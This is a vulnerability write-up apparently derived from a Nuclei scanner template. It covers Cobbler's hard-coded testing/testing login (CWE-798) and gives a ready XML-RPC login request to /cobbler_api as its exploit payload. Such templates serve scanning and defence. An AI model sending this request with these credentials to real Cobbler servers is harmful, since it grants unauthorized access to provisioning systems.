# Nuclei Template: Cobbler Default Login
**Template ID:** cobbler-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`cobbler-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Cobbler default login credentials for the testing module (testing/testing) were discovered.

## Steps to reproduce / Exploit Payload
```http
POST {{BaseURL}}/cobbler_api HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

<?xml version='1.0'?>
<methodCall>
  <methodName>login</methodName>
  <params>
    <param>
      <value>
        <string>{{username}}</string>
      </value>
    </param>
    <param>
      <value>
        <string>{{password}}</string>
      </value>
    </param>
  </params>
</methodCall>
```

## References
- https://seclists.org/oss-sec/2022/q1/146
- https://github.com/cobbler/cobbler/issues/2307
- https://github.com/cobbler/cobbler/issues/2909
